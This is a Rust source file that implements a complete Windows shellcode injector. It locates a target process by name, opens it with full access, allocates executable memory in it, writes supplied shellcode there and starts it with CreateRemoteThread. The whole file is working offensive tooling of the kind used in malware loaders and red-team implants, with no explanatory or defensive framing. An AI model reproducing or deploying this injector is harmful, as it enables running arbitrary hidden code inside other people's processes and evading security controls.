use std::mem::zeroed;
use windows::Win32::Foundation::{CloseHandle, HANDLE};
use windows::Win32::System::Diagnostics::Debug::WriteProcessMemory;
use windows::Win32::System::Diagnostics::ToolHelp::{
    CreateToolhelp32Snapshot, Process32FirstW, Process32NextW, PROCESSENTRY32W, TH32CS_SNAPPROCESS,
};
use windows::Win32::System::Memory::{
    VirtualAllocEx, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE,
};
use windows::Win32::System::Threading::{CreateRemoteThread, OpenProcess, PROCESS_ALL_ACCESS};

fn find_process(target_name: &str) -> Option<(HANDLE, u32)> {
    unsafe {
        // Take a snapshot of all processes
        let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
            .expect("[-] Failed to create process snapshot");

        // Initialize process entry structure
        let mut process_entry: PROCESSENTRY32W = zeroed();
        process_entry.dwSize = std::mem::size_of::<PROCESSENTRY32W>() as u32;

        // Get first process
        if Process32FirstW(snapshot, &mut process_entry).is_ok() {
            loop {
                let process_name = String::from_utf16_lossy(
                    &process_entry.szExeFile[..process_entry
                        .szExeFile
                        .iter()
                        .position(|&x| x == 0)
                        .unwrap_or(process_entry.szExeFile.len())],
                );

                if process_name.to_lowercase() == target_name.to_lowercase() {
                    if let Ok(process_handle) =
                        OpenProcess(PROCESS_ALL_ACCESS, false, process_entry.th32ProcessID)
                    {
                        let _ = CloseHandle(snapshot);
                        return Some((process_handle, process_entry.th32ProcessID));
                    }
                }

                // Get next process
                if Process32NextW(snapshot, &mut process_entry).is_err() {
                    break;
                }
            }
        }

        let _ = CloseHandle(snapshot);
    }

    None
}

fn allocate_memory_in_target(
    process_handle: HANDLE,
    size: usize,
) -> Option<*mut core::ffi::c_void> {
    unsafe {
        let remote_memory = VirtualAllocEx(
            process_handle,
            None, // Let system choose address
            size, // Size of memory to allocate
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE,
        );

        if remote_memory.is_null() {
            CloseHandle(process_handle).expect("[-] Failed to close process handle");
            None
        } else {
            Some(remote_memory)
        }
    }
}

fn write_shellcode_to_memory(
    process_handle: HANDLE,
    remote_memory: *mut core::ffi::c_void,
    shellcode: &[u8],
) -> bool {
    unsafe {
        WriteProcessMemory(
            process_handle,
            remote_memory as *mut _,
            shellcode.as_ptr() as *const _,
            shellcode.len(),
            None,
        )
        .is_ok()
    }
}

fn create_remote_thread(process_handle: HANDLE, remote_memory: *mut core::ffi::c_void) {
    unsafe {
        let thread_handle = CreateRemoteThread(
            process_handle,
            None,                                     // Default security descriptor
            0,                                        // Default stack size
            Some(std::mem::transmute(remote_memory)), // Thread start address
            None,                                     // No parameter
            0,                                        // Run thread immediately
            None,                                     // Don't receive thread ID
        )
        .expect("[-] Failed to create remote thread");

        CloseHandle(thread_handle).expect("[-] Failed to close thread handle");
        CloseHandle(process_handle).expect("[-] Failed to close process handle");
    }
}

pub fn inject_shellcode_to_target_process(target_name: &str, shellcode: &[u8]) -> u32 {
    // Find target process
    let (process_handle, process_id) =
        find_process(target_name).expect("[-] Failed to find target process");

    let remote_memory = allocate_memory_in_target(process_handle, shellcode.len())
        .expect("[-] Failed to allocate memory in target process");

    if !write_shellcode_to_memory(process_handle, remote_memory, shellcode) {
        panic!("[-] Failed to write shellcode to target process");
    }

    create_remote_thread(process_handle, remote_memory);

    process_id
}
